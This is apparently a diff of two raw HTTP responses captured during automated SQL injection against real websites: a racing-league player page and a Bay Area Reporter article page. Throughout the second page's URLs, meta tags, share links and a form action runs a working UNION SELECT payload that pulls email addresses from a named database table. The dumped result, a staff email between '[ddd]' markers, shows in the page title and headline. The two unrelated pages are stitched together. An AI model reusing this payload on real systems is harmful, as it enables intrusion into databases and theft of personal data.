@@ -1,114 +1,619 @@
 HTTP/1.1 200 OK
-Date: Mon, 13 Aug 2018 03:57:32 GMT
-Server: Apache/2.4.29 (Ubuntu)
-X-Powered-By: PHP/5.5.9-1ubuntu4.22
-Vary: Accept-Encoding
-Content-Length: 4477
+Date: Tue, 06 Feb 2018 17:28:23 GMT
+Server: Apache
+Vary: Accept-Encoding,User-Agent
 Connection: close
-Content-Type: text/html
+Content-Type: text/html; charset=UTF-8
 
-<style type="text/css">
+
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+        "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
+	<title>The Bay Area Reporter Online | [ddd]jim@ebar.com,jim@ebar.com,jim@ebar.com,jim@ebar.com,jim@ebar.com[ddd] </title>
+
+	<style type="text/css" title="text/css">@import url(/common/css/ebar2.css);</style>
+<style type="text/css" title="text/css">@import url(/common/css/blogfeed2.css);</style>
+<style type="text/css" title="text/css">@import url(/common/css/ts.css);</style>
+<style type="text/css" title="text/css">@import url(/common/css/te.css);</style>
+
+
+
+
+
+<script language="JavaScript" type="text/JavaScript">
+	<!--
+	function openWindow(theURL,winName,features) { 
+	  window.open(theURL,winName,features);
+	}
+	//-->
+</script>
+
+<!-- dd js -->
+	
+<script src="http://www.google-analytics.com/urchin.js" type="text/javascript"></script>
+<script type="text/javascript">
+	_uacct = "UA-358623-1";
+	urchinTracker();
+</script>
+
+
+<script src="http://ebar.com/common/js/operator.js" type="text/javascript"></script>
+
+<!--[if lt IE 7]>
+
+	<style type="text/css">
+		div.hr2 {margin-bottom: -10px;}
+		div.hr1 {margin-bottom: -14px;}
+	</style>
+
+<script type="text/javascript">//<![CDATA[
+	sfHover = function() {
+		var sfEls = document.getElementById("dropdown").getElementsByTagName("li");
+		for (var i=0; i<sfEls.length; i++) {
+			sfEls[i].onmouseover=function() {
+				this.className+=" sfhover";
+			}
+			sfEls[i].onmouseout=function() {
+				this.className=this.className.replace(new RegExp(" sfhover\\b"), "");
+			}
+		}
+	}
+
+	if (window.attachEvent) window.attachEvent("onload", sfHover);
+
+//]]>
+</script>
+<![endif]-->
+<meta property='fb:admins' content='bayareareporter' />
+<meta property='fb:app_id' content='228149160571176' />
+<meta property="og:url" content="http://bayareareporter.net/arts/art_article.php?sec=music&article=1180%20%26%26%201%3D2%20uNiON%20all%20SEleCT%201%2C%28select%20CONCAT%280x5b6464645d%2CIFNULL%28unhex%28Hex%28cast%28GROUP_CONCAT%28t.email%29%20as%20char%29%29%29%2C%27%20%27%29%2C0x5b6464645d%29%20FROM%20%28SELECT%20email%20FROM%20ebar_ebar.%60ARTS_OUT_ABOUT%60%20WHERE%20%60email%60%20LIKE%20char%2837%2C64%2C37%29%20LIMIT%20225%2C5%29t%20%20limit%200%2C1%29%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%20%20%23"/>
+<meta property="og:title" content="The Bay Area Reporter Online | [ddd]jim@ebar.com,jim@ebar.com,jim@ebar.com,jim@ebar.com,jim@ebar.com[ddd]"/>
+<meta property='og:site_name' content='Bay Area Reporter' />
+<meta property='og:description' content='Breaking news & opinion from the B.A.R.' />
+
+<meta property="og:image" content="http://ebar.com/barmini2.jpg" />
+
+<meta property="og:type" content="article"/>
+
+<link rel="image_src" href="http://ebar.com/barmini2.jpg" />
+</head>
+
+<body>
+	<div id="wrapper">
+		<div id="wrapperl">
+
+	<div id="masthead">
+		<!--/* OpenX iFrame Tag v2.8.7 */-->
+
+<iframe id='a1af1c5d' name='a1af1c5d' src='http://ebar.com/ads/www/delivery/afr.php?zoneid=3&amp;target=_blank&amp;cb=INSERT_RANDOM_NUMBER_HERE' frameborder='0' scrolling='no' width='728' height='90'><a href='http://ebar.com/ads/www/delivery/ck.php?n=a2441824&amp;cb=INSERT_RANDOM_NUMBER_HERE' target='_blank'><img src='http://ebar.com/ads/www/delivery/avw.php?zoneid=3&amp;cb=INSERT_RANDOM_NUMBER_HERE&amp;n=a2441824' border='0' alt='' /></a></iframe>
+
+<br />
+
+	<div id="nameplate" onclick="location.href='http://www.ebar.com';" style="cursor:pointer;">
+	<div id="date">Issue: &nbsp;Vol. 48 / No. 5 / 1 February 2018</div>
+		
+	
+	</div>
+	
+	<div class="clear">&nbsp;</div>
+	<ul id="dropdown">
+
+
+	<li id="about" style="width:80px;"><a class="big" href="/about/">About</a>
+		<ul>
+			<li><a href="/about/">About the B.A.R.</a></li>
+			<li><a href="/advertising">Advertising</a></li>
+		</ul>
+	</li>
+
+	<li id="news" style="width:80px;"><a class="big" href="/news/">News</a></li>
+	
+	<li id="columns" style="width:97px;"><a class="big" href="/columns/">Opinion</a></li>
+
+	<li id="arts" style="width:69px;"><a class="big" href="/arts/">Arts</a></li>
+	
+	<li id="obituaries" style="width:112px"><a href="/obituaries" class="big">Obituaries</a></li>
+<li id="bartab" style="width:89px;"><a href="/bartab" class="big">BARtab</a></li>
+
+	<li style="width:87px" id="archives"><a class="big" href="/archives/">Search</a></li>
+
+	<li style="" id="classifieds"><a class="big" href="/classifieds/">Classifieds</a></li>
+
+</ul><div class="clear"></div>
+
+	</div>
+
+	<div id="main" class="content">
+		<!-- ++Begin Dynamic Feed Wizard Generated Code++ -->
+  <!--
+  // Created with a Google AJAX Search and Feed Wizard
+  // http://code.google.com/apis/ajaxsearch/wizards.html
+  -->
+
+  <!--
+  // The Following div element will end up holding the actual feed control.
+  // You can place this anywhere on your page.
+  -->
+  <div id="feed-control" style="background-color: #000000;float: left;font-family:Arial,sans-serif;font-size: 13px;height: 2.1em;margin: -25px 0 30px 7px;overflow: hidden;position: relative;text-align: center;white-space: nowrap;width: 728px;">
+<div style="margin:4px;padding:4px;color:#FFFFFF;font-size:11px;test-transform:uppercase;"><a style="color:#FFFFFF;font-size:11px;test-transform:uppercase;" href="http://ebar.com/blogs">Click Here to Read the Latest News from Bay Area Reporter Weblogs</a></div>
+  </div>
+
+  <!-- Google Ajax Api
+  -->
+  <script src="http://www.google.com/jsapi?key=notsupplied-wizard"
+    type="text/javascript"></script>
+
+  <!-- Dynamic Feed Control and Stylesheet -->
+  <script src="http://www.google.com/uds/solutions/dynamicfeed/gfdynamicfeedcontrol.js"
+    type="text/javascript"></script>
+
+  <script type="text/javascript">
+    function LoadDynamicFeedControl() {
+      var feeds = [
+	{title: 'Latest Blogs',
+	 url: 'http://ebar.com/blogs/?feed=rss2'
+	}];
+      var options = {
+        stacked : false,
+        horizontal : true,
+        title : ""
+      }
+
+      new GFdynamicFeedControl(feeds, 'feed-control', options);
+    }
+    // Load the feeds API and set the onload callback.
+    google.load('feeds', '1');
+    google.setOnLoadCallback(LoadDynamicFeedControl);
+  </script>
+<!-- ++End Dynamic Feed Control Wizard Generated Code++ -->
+                <!-- ++End Dynamic Feed Control Wizard Generated Code++ -->		
+
+	<div id="center">
+		
+
+	
+ 	<!-- Article header -->
+	<div class="centercol">
+
+		<div style="width: 710px; margin:0 0 0 7px; float: left;">
+
+	<div style="width:500px;float:left;">
+	<h1 class="sechead">[ddd]jim@ebar.com,jim@ebar.com,jim@ebar.com,jim@ebar.com,jim@ebar.com[ddd]</h1>
+	</div>
+
+	<div style="width:130px; height: 40px;float:right; margin:7px 0 0 0; text-align: right;">
+	<h1 class="feature_pink">Music</h1>
+</div>
+
+</div>
+	
+	<div style="width: 710px; margin: 0pt 0pt 0 7px; float: left;">
+	
+
+
+ 	 <h2 class="lead">22</h2> 	<hr style="margin: 0 0 10px;"> 
+	  <div class="articledate" style="float: right; margin: -4px 0 4px 0;">
+	  Published //26	 </div>
+
+	 <p class="excerpt" style="float:left;">
+	  <h3 class="byline">3 </h3> 	  <p><a href="mailto:25" class="tools">25</a></p> 	 </p>
+
+ </div>
+
+	</div> <!-- end article header, centercol div -->
+
+	<!-- Article body -->
+	<div class="centercol">
+	
+	<p>
+	 <table align="left" cellpadding="0" cellspacing="0" border="0">
+		<tr>
+	 	 <td rowspan="4"><img src="/common/img/spacer.gif" width="7" height="2"></td>
+		</tr>
+ 
+		<tr><td align="left"><img src="http://ebar.com5" width="300px"></td></tr><tr><td><div class="article_caption_lrg">6</td></tr>		<tr>
+		 <td>
+	 	 <div class="tools">
+<table width="300" height="70" border="0" cellpadding="0" cellspacing="0" align="center" style="margin:8px 0 0 0;">
+	<tr>
+		<td colspan="2">
+			<img src="/common/img/article_tools_headder.gif" width="300" height="25" alt=""></td>
+	</tr>
+<!--- PRINT PAGE -->
+	<tr>
+		<td width="31">
+			<img src="/common/img/article_tools_print_icon.gif" width="31" height="16" alt=""></td>
+		<td width="174"><a href="/common/inc/article_print.php?sec=music&article=1" onclick="openWindow(this.href,'print','width=538,height=500, scrollbars=yes');return false;"  class="tools">Print this Page</a></td>
+	</tr>
+<!--- SEND TO A FRIEND -->
+	<tr>
+		<td>
+			<img src="/common/img/article_tools_mail_icon.gif" width="31" height="16" alt=""></td>
+		<td width="174">
+			<a href="/common/inc/staf.php?sec=music&article=1" class="tools">Send to a Friend</a></td>
+	</tr>
+
+<!--- SHARE ON FACEBOOK -->
+	<tr>
+		<td width="31">
+			<img src="/common/img/facebook_share_icon.gif" width="31" height="16" alt=""></td>
+		<td width="174"><script>function fbs_click() {u=location.href;t=document.title;i1='http://ebar.com5';d='4';window.open('http://www.facebook.com/sharer/sharer.php?s=100&p[url]='+encodeURIComponent(u)+'&p[title]='+encodeURIComponent(t)+'&p[images][0]='+encodeURIComponent(i1)+'&p[summary]='+encodeURIComponent(d),'sharer','toolbar=0,status=0,width=626,height=436');return false;}</script><style> html .fb_share_link { padding:2px 0 0 0; height:16px; color:#4E84C0; }</style><a href="http://www.facebook.com/share.php?u=<url>" onclick="return fbs_click()" target="_blank" class="fb_share_link">Share on Facebook</a></td>
+	</tr>
+
+<!--- SHARE ON TWITTER -->
+
+
+
+
+	<tr>
+		<td width="31">
+			<img src="/common/img/twitter_icon.gif" width="31" height="16" alt=""></td>
+		<td width="174"><a href="http://twitter.com/home?status=Currently reading... [ddd]jim@ebar.com,jim@ebar.com,jim@ebar.com,jim@ebar.com,jim@ebar.com[ddd] - http://bayareareporter.net/arts/art_article.php?sec=music%26article=1180%20%26%26%201%3D2%20uNiON%20all%20SEleCT%201%2C%28select%20CONCAT%280x5b6464645d%2CIFNULL%28unhex%28Hex%28cast%28GROUP_CONCAT%28t.email%29%20as%20char%29%29%29%2C%27%20%27%29%2C0x5b6464645d%29%20FROM%20%28SELECT%20email%20FROM%20ebar_ebar.%60ARTS_OUT_ABOUT%60%20WHERE%20%60email%60%20LIKE%20char%2837%2C64%2C37%29%20LIMIT%20225%2C5%29t%20%20limit%200%2C1%29%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%20%20%23" title="Click to share this post on Twitter" class="tools">Share on Twitter</a></td>
+	</tr>
+
+<!--- SHARE ON MYSPACE -->
+
+
+
+
+	<tr>
+		<td width="31">
+			<img src="/common/img/myspace_icon.gif" width="31" height="16" alt=""></td>
+		<td width="174"><form id="myspacepostto" method="post" action="http://www.myspace.com/index.cfm?fuseaction=postto"
+target="_blank">
+    <input type="hidden" name="t" value="[ddd]jim@ebar.com,jim@ebar.com,jim@ebar.com,jim@ebar.com,jim@ebar.com[ddd]" />
+    <input type="hidden" name="c" value="" />
+    <input type="hidden" name="u" value="http://bayareareporter.net/arts/art_article.php?sec=music&amp;article=1180%20%26%26%201%3D2%20uNiON%20all%20SEleCT%201%2C%28select%20CONCAT%280x5b6464645d%2CIFNULL%28unhex%28Hex%28cast%28GROUP_CONCAT%28t.email%29%20as%20char%29%29%29%2C%27%20%27%29%2C0x5b6464645d%29%20FROM%20%28SELECT%20email%20FROM%20ebar_ebar.%60ARTS_OUT_ABOUT%60%20WHERE%20%60email%60%20LIKE%20char%2837%2C64%2C37%29%20LIMIT%20225%2C5%29t%20%20limit%200%2C1%29%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%20%20%23" />
+    <input type="hidden" name="r" value="http://bayareareporter.net/arts/art_article.php?sec=music&amp;article=1180%20%26%26%201%3D2%20uNiON%20all%20SEleCT%201%2C%28select%20CONCAT%280x5b6464645d%2CIFNULL%28unhex%28Hex%28cast%28GROUP_CONCAT%28t.email%29%20as%20char%29%29%29%2C%27%20%27%29%2C0x5b6464645d%29%20FROM%20%28SELECT%20email%20FROM%20ebar_ebar.%60ARTS_OUT_ABOUT%60%20WHERE%20%60email%60%20LIKE%20char%2837%2C64%2C37%29%20LIMIT%20225%2C5%29t%20%20limit%200%2C1%29%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%20%20%23" />
+    <input type="hidden" name="l" value=" " />
+    <a href="#" onclick="document.getElementById('myspacepostto').submit();return false;" class="tools">Share on MySpace!</a>
+</form>
+</td>
+	</tr>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<tr>
+		<td colspan="2">
+</td>
+</tr>
+	<tr>
+		<td colspan="2">
+			<img src="/common/img/article_tools_footer.gif" width="300" height="9" alt=""></td>
+	</tr>
+
+
+
 <!--
-.basestyle {
-	color: #FFFFFF;
-	font-size: 10px;
-	font-family: Verdana, Arial, Helvetica, sans-serif;
-}
-h1 {
-	font-size: 16px;
-	font-weight: bold;
-	font-family: Verdana, Arial, Helvetica, sans-serif;
-}
-body, td, p, input {
-	font-size: 11px;
-	font-family: Verdana, Arial, Helvetica, sans-serif;
-	color: #333333;
-}
-.navlinks {
-	font-size: 14px;
-	font-family: Arial, Helvetica, sans-serif;
-	font-weight: bold;
-	color: #FFFFFF;
-}
+	<tr>
+		<td colspan="2"><font color="#EF047E"><br><p><b></b></p>
+			<form action="/arts/art_article.php?sec=music&article=1180 && 1=2 uNiON all SEleCT 1,(select CONCAT(0x5b6464645d,IFNULL(unhex(Hex(cast(GROUP_CONCAT(t.email) as char))),' '),0x5b6464645d) FROM (SELECT email FROM ebar_ebar.`ARTS_OUT_ABOUT` WHERE `email` LIKE char(37,64,37) LIMIT 225,5)t  limit 0,1),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26  #" method="POST" name="newsletterform" enctype="multipart/form-data">
+				&nbsp;&nbsp;&nbsp;email: <input type="text" name="email" size="15" maxsize="45">
+				<input type="hidden" name="process" value="1">
+				<br><center><input type="image" src="/common/img/but_submit.gif" border="0" name="submit" value="submit"></center>
+			</form></font></td>
+	</tr>
+	<tr>
+		<td colspan="2">
+			<img src="/common/img/article_tools_footer.gif" width="205" height="9" alt=""></td>
+	</tr>
 -->
-</style>
-<title>TW Racing Cup</title><center><table width="755" border="0" cellpadding="0" cellspacing="0">
-  
-<!--DWLayoutTable-->
-  <tr>
-    <td height="155" colspan="2" valign="top"><object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="755" height="155">
-      <param name="movie" value="twrclogo.swf">
-      <param name="quality" value="high">
-      <embed src="twrclogo.swf" quality="high" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" width="755" height="155"></embed>
-    </object></td>
-  </tr>
-  <tr>
-    <td width="185" height="150" valign="top" bgcolor="#d80000"><p align="center"><img src="sidetop.gif" width="185" height="14"><br>
-          <img src="flagchecker2.gif" width="125" height="39" align="top"> <br>
-          <br>
-        </p>
-      <table width="139" height="29" border="0" align="center">
-        <!--DWLayoutTable-->
-        <tr>
-          <td width="133"><div align="center" class="navlinks">
-            <div align="left">:: <a href="index.php" class="navlinks">Home</a></div>
-          </div></td>
-        </tr>
-        <tr>
-          <td height="18" valign="top" class="navlinks"><div align="left">:: <a href="whatis.php" class="navlinks">What is</a> </div></td>
-        </tr>
-        <tr>
-          <td height="18" valign="top" class="navlinks"><div align="left">:: <a href="standings.php" class="navlinks">Standings</a></div></td>
-        </tr>
-        <tr>
-          <td height="18" valign="top" class="navlinks"><div align="left">:: <a href="championship.php" class="navlinks">Championship </a></div></td>
-        </tr>
-        <tr>
-          <td height="19" valign="top" class="navlinks">:: <a href="tracks.php" class="navlinks">Tracks</a></td>
-        </tr>
-        <tr>
-          <td height="18" valign="top" class="navlinks">:: <a href="carinfo.php" class="navlinks">Car Info</a> </td>
-        </tr>
-        <tr>
-          <td height="18" valign="top" class="navlinks">:: <a href="rules.php" class="navlinks">Rules</a> </td>
-        </tr>
-        <tr>
-          <td height="21" valign="top" class="navlinks">:: <a href="develop.php" class="navlinks">Develop</a> </td>
-        </tr>
-        <tr>
-          <td height="5"></td>
-        </tr>
-      </table>
-      <p align="center"><img src="flagchecker2.gif" width="125" height="39" align="bottom"><br>
-      </p></td>
-    <td width="570" rowspan="2" valign="top" style="padding-left:20px; padding-top:25px; padding-right:40px; padding-bottom:35px; "><h1><img src="RaceLogo.gif" width="100" height="56" align="right"><br>
-          Info person:</h1> 
-        <p><strong>Name:</strong> [ddd]trench_TWRC@localhost[ddd] <br><strong>Total points:</strong> 3</p>        <p>Last 30 points given:</p>
-        <table width="477" border="1" align="center">
-          <tr>
-            <td width="117"><div align="center"><strong>Date</strong></div></td>
-            <td width="117"><div align="center"><strong>Added points </strong></div></td>
-            <td width="221"><div align="center"><strong> Reason </strong></div></td>
-          </tr>
-                  </table>        <p><br>
-        </p>
-      </td>
-  </tr>
-  <tr>
-    <td height="20" valign="top"><img src="sidebottom.gif" width="185" height="20"></td>
-  </tr>
-</table>
-<table width="755" border="0" cellpadding="0" cellspacing="0">
-  <!--DWLayoutTable-->
-  <tr>
-    <td width="26" height="51" valign="top"><img src="baseleft.gif" width="26" height="51"></td>
-    <td width="703" valign="top" bgcolor="#ef8406"><div align="center"><span class="style3"><br>
-      </span><span class="basestyle">TW Dev - <a href="http://www.trenchwars.org" target="_blank" class="basestyle">Trenchwars.org</a> <br>
-  TWRC ops: Ice Storm
-      - Jacen Solo - Rodge_Rabbit - SuperDave(postal)</span><br>
-      </div></td>
-    <td width="26" valign="top"><img src="baseright.gif" width="26" height="51"></td>
-  </tr>
-</table>
+
+<tr>
+		<td colspan="2">
+			</td>
+	</tr>
+
+
+</table></div>
+
+
+		<!--/* OpenX iFrame Tag v2.8.7 */-->
+<div style="width:300px;height:270px; background:#ccc; padding:5px 11px;margin:10px 10px 0 -17px; text-align:center; font-size:8px; letter-spacing:10px; line-height:15px;">ADVERTISMENT
+		<iframe id='a8e85611' name='a8e85611' src='http://ebar.com/ads/www/delivery/afr.php?zoneid=15&amp;cb=INSERT_RANDOM_NUMBER_HERE' frameborder='0' scrolling='no' width='300' height='250'><a href='http://ebar.com/ads/www/delivery/ck.php?n=a9b9cbec&amp;cb=INSERT_RANDOM_NUMBER_HERE' target='_blank'><img src='http://ebar.com/ads/www/delivery/avw.php?zoneid=15&amp;cb=INSERT_RANDOM_NUMBER_HERE&amp;n=a9b9cbec' border='0' alt='' /></a></iframe>
+	 	</div>
+	
+	 </td>
+		</tr>
+	 </table>
+
+	 <!-- Article Copy  -->
+	 <div class="article">
+	 4<table align="left" border="0" cellpadding="0" cellspacing="0"><tr><td align="left"><img src="http://ebar.com7" id="img_medium"></td></tr><tr><td><div class="article_caption">8</div></td></tr></table><br>
 <br>
-</center>
+
+<!-- <div id="fb-root"></div><script src="http://connect.facebook.net/en_US/all.js#appId=228149160571176&amp;xfbml=1"></script><fb:like href="http://bayareareporter.net/arts/art_article.php?sec=music%26article=1180%20%26%26%201%3D2%20uNiON%20all%20SEleCT%201%2C%28select%20CONCAT%280x5b6464645d%2CIFNULL%28unhex%28Hex%28cast%28GROUP_CONCAT%28t.email%29%20as%20char%29%29%29%2C%27%20%27%29%2C0x5b6464645d%29%20FROM%20%28SELECT%20email%20FROM%20ebar_ebar.%60ARTS_OUT_ABOUT%60%20WHERE%20%60email%60%20LIKE%20char%2837%2C64%2C37%29%20LIMIT%20225%2C5%29t%20%20limit%200%2C1%29%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%20%20%23" send="true" width="450" show_faces="false" action="recommend" font="arial"></fb:like> -->
+ <br>
+<br>
+
+<div id="fb-root" style=""></div>
+<script src="http://connect.facebook.net/en_US/all.js#appId=228149160571176&amp;xfbml=1"></script>
+<script>
+ var articleURL;
+  articleURL = 'http://bayareareporter.net/arts/art_article.php?sec=music&amp;article=1180%20%26%26%201%3D2%20uNiON%20all%20SEleCT%201%2C%28select%20CONCAT%280x5b6464645d%2CIFNULL%28unhex%28Hex%28cast%28GROUP_CONCAT%28t.email%29%20as%20char%29%29%29%2C%27%20%27%29%2C0x5b6464645d%29%20FROM%20%28SELECT%20email%20FROM%20ebar_ebar.%60ARTS_OUT_ABOUT%60%20WHERE%20%60email%60%20LIKE%20char%2837%2C64%2C37%29%20LIMIT%20225%2C5%29t%20%20limit%200%2C1%29%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%20%20%23';
+ document.write('<fb:comments href="'+ articleURL +'" numposts="25" width="590" ><\/fb:comments>');
+</script>
+
+
+</div>
+</div>
+
+</div> <!-- end center div -->
+
+</div>
+<div class="clear"></div>
+<div class="hr1"></div>
+
+
+<br /><div id="footer">
+	<p>Copyright &copy; 2016, Bay Area Reporter, a division of BAR, Inc. All Rights Reserved.</p>
+	<a href="/index.php" class="footer">Home</a>&nbsp;&nbsp;|&nbsp;&nbsp;
+	<a href="/news/" class="footer">News</a>&nbsp;&nbsp;|&nbsp;&nbsp;
+	<a href="/openforum/" class="footer">Open Forum</a>&nbsp;&nbsp;|&nbsp;&nbsp;
+	<a href="/columns/" class="footer">Columns</a>&nbsp;&nbsp;|&nbsp;&nbsp;
+	<a href="/arts/" class="footer">Arts &amp; Entertainment</a>&nbsp;&nbsp;|&nbsp;&nbsp;
+	<a href="/artscolumns/" class="footer">Arts Columns</a>&nbsp;&nbsp;|&nbsp;&nbsp;
+	<a href="/bartab/" class="footer">BARtab</a>&nbsp;&nbsp;|&nbsp;&nbsp;
+	<a href="/classifieds/" class="footer">Classifieds</a>&nbsp;&nbsp;|&nbsp;&nbsp;
+	<a href="/obituaries/" class="footer">Obituaries</a>&nbsp;&nbsp;|&nbsp;&nbsp;
+	<a href="/archives/" class="footer">Archives</a>&nbsp;&nbsp;|&nbsp;&nbsp;
+	<a href="/about/" class="footer">About the BAR</a>&nbsp;&nbsp;|&nbsp;&nbsp;
+	<a href="/advertising" class="footer">Advertising</a>
+	<br>
+	
+<br>
+<!--/* OpenX Footer iFrame ad Tag v2.8.1 */-->
+
+<iframe id='acbb0fa6' name='acbb0fa6' src='http://ebar.com/ads/www/delivery/afr.php?zoneid=3&amp;cb=INSERT_RANDOM_NUMBER_HERE' frameborder='0' scrolling='no' width='728' height='90'><a href='http://ebar.com/ads/www/delivery/ck.php?n=abf59a3d&amp;cb=INSERT_RANDOM_NUMBER_HERE' target='_blank'><img src='http://ebar.com/ads/www/delivery/avw.php?zoneid=3&amp;cb=INSERT_RANDOM_NUMBER_HERE&amp;n=abf59a3d' border='0' alt='' /></a></iframe>
+
+<!-- Start Quantcast tag -->
+<script type="text/javascript" src="http://edge.quantserve.com/
+quant.js"></script>
+<script type="text/javascript">_qacct="p-85pvd3d23u7MU";quantserve
+();</script>
+<noscript>
+<a href="http://www.quantcast.com/p-85pvd3d23u7MU"
+target="_blank"><img src="http://pixel.quantserve.com/pixel/
+p-85pvd3d23u7MU.gif" style="display: none;" border="0" height="1"
+width="1" alt="Quantcast"/></a>
+</noscript>
+<!-- End Quantcast tag -->
+
+<br>
+
+</div>
+</div>
+
+<div id="wrapperr">
+<div id="adstop">
+	<div style="width:300px; height:30px; float:left; margin-left:7px;">
+		Follow The Bay Area Reporter 
+		</div>
+		<div style="width:59px; height:60px; float:left;margin:0 0 0 8px;">
+			<a href="http://www.facebook.com/pages/Bay-Area-Reporter/395391936135" alt="Follow Us on Facebook"> <img src="http://ebar.com/images/topicon/facebook-icon.jpg" width="60" height="60" alt="facebook logo" /></a>
+			</div>
+			<div style="width:59px; height:60px; float:left;">
+				<a href="http://twitter.com/ebarnews" alt="Follow Us on Twitter"> <img src="http://ebar.com/images/topicon/twitter_icon.jpg" width="60" height="60" alt="facebook logo" /></a>
+				</div>
+		
+				<div style="width:59px; height:60px; float:left; margin:0 0 0 0;">
+					<a href="http://ebar.com/newsletter" alt="Subscribe to Our Newsletter"> <img src="http://ebar.com/images/topicon/newsletter.jpg" width="60" height="60" alt="Newsletter logo" /></a>
+					</div>
+					<div style="width:59px; height:60px; float:left; margin:0 0 0 0;">
+						<a href="http://ebar.com/blogs/?feed=rss" alt="Subscribe to Our RSS Feed"> <img src="http://ebar.com/images/topicon/glossy_feed_icon.jpg" width="60" height="60" alt="Newsletter logo" /></a>
+						</div>
+
+
+<div style="width: 55px; height: 60px; float: left;  margin:0 0 0 0;">
+	<a href="http://issuu.com/bayareareporter" alt="Read Backissues On Issuu"> <img src="http://ebar.com/images/topicon/Issue_Icon.jpg" width="60" height="60" alt="ISSUU logo" /></a>
+	</div>
+
+
+
+</div>
+<div id="adstop2">
+	<!--/* OpenX iFrame Tag v2.8.1 */-->
+
+	<iframe id='aae49eb5' name='aae49eb5' src='http://ebar.com/ads/www/delivery/afr.php?zoneid=11&amp;target=_blank&amp;cb=INSERT_RANDOM_NUMBER_HERE' framespacing='0' frameborder='no' scrolling='no' width='300' height='250'><a href='http://ebar.com/ads/www/delivery/ck.php?n=a06f68aa&amp;cb=INSERT_RANDOM_NUMBER_HERE' target='_blank'><img src='http://ebar.com/ads/www/delivery/avw.php?zoneid=11&amp;cb=INSERT_RANDOM_NUMBER_HERE&amp;n=a06f68aa' border='0' alt='' /></a></iframe>
+
+</div>
+
+<div id="leftcol">
+		<div class="banner">
+		<!--/* OpenX Javascript Tag v2.8.1 */-->
+
+		<script type='text/javascript'><!--//<![CDATA[
+		   var m3_u = (location.protocol=='https:'?'https://ebar.com/ads/www/delivery/ajs.php':'http://ebar.com/ads/www/delivery/ajs.php');
+		   var m3_r = Math.floor(Math.random()*99999999999);
+		   if (!document.MAX_used) document.MAX_used = ',';
+		   document.write ("<scr"+"ipt type='text/javascript' src='"+m3_u);
+		   document.write ("?zoneid=6&amp;target=_blank&amp;block=1");
+		   document.write ('&amp;cb=' + m3_r);
+		   if (document.MAX_used != ',') document.write ("&amp;exclude=" + document.MAX_used);
+		   document.write (document.charset ? '&amp;charset='+document.charset : (document.characterSet ? '&amp;charset='+document.characterSet : ''));
+		   document.write ("&amp;loc=" + escape(window.location));
+		   if (document.referrer) document.write ("&amp;referer=" + escape(document.referrer));
+		   if (document.context) document.write ("&context=" + escape(document.context));
+		   if (document.mmm_fo) document.write ("&amp;mmm_fo=1");
+		   document.write ("'><\/scr"+"ipt>");
+		//]]>--></script><noscript><a href='http://ebar.com/ads/www/delivery/ck.php?n=aeffa601&amp;cb=INSERT_RANDOM_NUMBER_HERE' target='_blank'><img src='http://ebar.com/ads/www/delivery/avw.php?zoneid=6&amp;cb=INSERT_RANDOM_NUMBER_HERE&amp;n=aeffa601' border='0' alt='' /></a></noscript>
+
+
+</div>
+</div>
+<div id="rightcol">
+	
+<div class="banner">
+	<!--/* OpenX Javascript Tag v2.8.1 */-->
+
+	<script type='text/javascript'><!--//<![CDATA[
+	   var m3_u = (location.protocol=='https:'?'https://ebar.com/ads/www/delivery/ajs.php':'http://ebar.com/ads/www/delivery/ajs.php');
+	   var m3_r = Math.floor(Math.random()*99999999999);
+	   if (!document.MAX_used) document.MAX_used = ',';
+	   document.write ("<scr"+"ipt type='text/javascript' src='"+m3_u);
+	   document.write ("?zoneid=12&amp;target=_blank&amp;block=1");
+	   document.write ('&amp;cb=' + m3_r);
+	   if (document.MAX_used != ',') document.write ("&amp;exclude=" + document.MAX_used);
+	   document.write (document.charset ? '&amp;charset='+document.charset : (document.characterSet ? '&amp;charset='+document.characterSet : ''));
+	   document.write ("&amp;loc=" + escape(window.location));
+	   if (document.referrer) document.write ("&amp;referer=" + escape(document.referrer));
+	   if (document.context) document.write ("&context=" + escape(document.context));
+	   if (document.mmm_fo) document.write ("&amp;mmm_fo=1");
+	   document.write ("'><\/scr"+"ipt>");
+	//]]>--></script><noscript><a href='http://ebar.com/ads/www/delivery/ck.php?n=a72b4b6f&amp;cb=INSERT_RANDOM_NUMBER_HERE' target='_blank'><img src='http://ebar.com/ads/www/delivery/avw.php?zoneid=12&amp;cb=INSERT_RANDOM_NUMBER_HERE&amp;n=a72b4b6f' border='0' alt='' /></a></noscript>
+</div>
+</div>
+<div id="adstop2">
+	<!--/* OpenX iFrame Tag v2.8.1 */-->
+
